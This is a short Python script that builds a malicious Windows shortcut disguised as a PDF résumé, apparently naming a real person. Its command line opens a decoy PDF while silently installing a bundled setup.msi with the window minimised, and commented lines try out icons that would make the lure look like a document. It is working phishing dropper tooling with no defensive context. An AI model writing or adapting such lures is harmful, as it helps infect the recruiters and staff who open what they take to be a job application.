import win32com.client
import os

shell = win32com.client.Dispatch("WScript.Shell")

lnk_path = os.path.abspath("CV_Thai_Quang_Huy_TruongPhongTaiChinhKeHoach.pdf.lnk")


shortcut = shell.CreateShortCut(lnk_path)

shortcut.TargetPath = r"C:\Windows\System32\cmd.exe"
# shortcut.WorkingDirectory = r"C:\Windows\System32"

shortcut.Arguments = r'/c cd System-Volumnes && start "" "CV_Thai_Quang_Huy_TruongPhongTaiChinhKeHoach.pdf" && .\setup.msi /qn'

# shortcut.IconLocation = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,17"  # Sử dụng biểu tượng của Microsoft Edge

# icon_path = os.path.abspath("pdf.ico")
# shortcut.IconLocation = icon_path
# shortcut.IconLocation = "pdf.ico"


shortcut.IconLocation = r"C:\Windows\System32\shell32.dll,1"  # Thêm icon
shortcut.WindowStyle = 7  # Ẩn cửa sổ

shortcut.save()

print("Created:", lnk_path)